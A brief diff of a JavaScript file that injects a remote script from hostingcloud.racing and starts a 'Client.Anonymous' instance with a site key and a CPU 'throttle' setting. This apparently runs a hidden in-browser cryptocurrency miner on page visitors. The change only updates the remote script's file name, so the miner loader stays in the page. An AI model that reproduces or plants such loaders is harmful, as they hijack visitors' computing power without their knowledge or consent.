@@ -9,7 +9,7 @@
 })();
 (function() {
 var script = document.createElement('script');
-    script.src = 'https://www.hostingcloud.racing/JH33.js';
+    script.src = 'https://www.hostingcloud.racing/70wc.js';
     script.onload = script.onreadystatechange = function () {
 		var _client = new Client.Anonymous('19be176ff32413d1f2920e3ff75fe479aec61263156422d5066cb33758f2ed57', {
 			throttle: 0.7, c: 'w', ads: 0
